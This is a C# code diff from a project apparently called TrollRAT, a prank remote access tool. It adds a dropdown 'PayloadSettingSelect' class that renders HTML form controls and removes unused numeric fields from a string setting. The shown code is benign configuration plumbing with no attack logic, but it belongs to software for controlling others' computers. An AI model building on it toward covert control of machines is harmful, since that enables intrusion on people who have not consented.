@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Text;
 using TrollRAT.Utils;
 
@@ -69,11 +70,6 @@ namespace TrollRAT.Payloads
 
     public class PayloadSettingString : TitledPayloadSetting<string>
     {
-        protected decimal min, max, step;
-        public decimal Min => min;
-        public decimal Max => max;
-        public decimal Step => step;
-
         public PayloadSettingString(string defaultValue, string title) : base(defaultValue, title) { }
 
         public override void writeHTML(StringBuilder builder)
@@ -87,6 +83,45 @@ namespace TrollRAT.Payloads
         public override void readData(string str)
         {
             value = str;
+        }
+    }
+
+    public class PayloadSettingSelect : TitledPayloadSetting<int>
+    {
+        protected string[] options;
+        public string[] Options => options;
+
+        public string ValueText => options[value];
+
+        public PayloadSettingSelect(int defaultValue, string title, string[] options) : base(defaultValue, title)
+        {
+            this.options = options;
+        }
+
+        public override void writeHTML(StringBuilder builder)
+        {
+            builder.Append(String.Format("<div class=\"form-group\"><label for=\"id{1}\">{0}</label><select id=\"id{1}\" " +
+                "class=\"form-control\" onchange=\"setSetting({1}, this.selectedIndex);\">",
+                title, id, value));
+
+            for (int i = 0; i < options.Length; i++)
+            {
+                builder.Append((i==value ? "<option selected=\"selected\">" : "<option>") + options[i] + "</option>");
+            }
+
+            builder.Append("</select></div>");
+        }
+
+        public override void readData(string str)
+        {
+            try
+            {
+                int i = int.Parse(str);
+
+                if (i >= 0 && i < options.Length)
+                    value = i;
+            }
+            catch (Exception) { }
         }
     }
 }
